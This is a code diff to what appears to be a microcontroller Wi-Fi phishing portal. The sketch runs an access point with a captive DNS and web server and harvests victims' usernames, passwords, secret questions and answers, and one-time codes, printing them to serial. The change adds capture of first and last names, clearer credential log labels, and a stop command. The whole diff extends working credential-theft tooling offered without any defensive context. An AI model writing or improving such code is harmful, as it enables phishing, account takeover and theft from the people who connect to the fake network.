@@ -18,6 +18,7 @@
 #define RESET_CMD "reset"
 #define START_CMD "start"
 #define ACK_CMD "ack"
+#define STOP_CMD "stop"
 
 // GLOBALS
 DNSServer dnsServer;
@@ -30,6 +31,8 @@ String password;
 bool name_received = false;
 bool password_received = false;
 
+String first_name;
+String last_name;
 String secret_question;
 String secret_answer;
 String otp;
@@ -140,6 +143,18 @@ void setupServer()
       password_received = true;
     }
 
+    if (request->hasParam("first_name")) {
+      first_name = request->getParam("first_name")->value();
+    } else {
+      first_name = "";
+    }
+
+    if (request->hasParam("last_name")) {
+      last_name = request->getParam("last_name")->value();
+    } else {
+      last_name = "";
+    }
+
     if (request->hasParam("secret_question")) {
       secret_question = request->getParam("secret_question")->value();
     } else {
@@ -183,6 +198,13 @@ void setupServer()
   // Start the server
   server.begin();
   Serial.println("Server started.");
+}
+
+void stopServer()
+{
+  server.end();
+  dnsServer.stop();
+  Serial.println("Server stopped.");
 }
 
 void startAP()
@@ -290,12 +312,18 @@ void loop()
   {
     name_received = false;
     password_received = false;
-    String logValue1 = "u: " + user_name;
-    String logValue2 = "p: " + password;
-    Serial.println(logValue1);
-    Serial.println(logValue2);
+    String logValue1 = "Username: " + user_name;
+    String logValue2 = "Password: " + password;
 
     Serial.println("---------------------------------------"); // Added semicolon
+    Serial.println(logValue1);
+    Serial.println(logValue2);
+    if (!first_name.isEmpty()) {
+      Serial.println("first name: " + first_name);
+    }
+    if (!last_name.isEmpty()) {
+      Serial.println("last name: " + last_name);
+    }
     if (!secret_question.isEmpty()) {
       Serial.println("Secret Q: " + secret_question);
     }
@@ -320,5 +348,10 @@ void loop()
   {
     Serial.println("reseting");
     resetFunction();
+  }
+  if (checkForCommand(STOP_CMD))
+  {
+    Serial.println("stopping server");
+    stopServer();
   }
 }
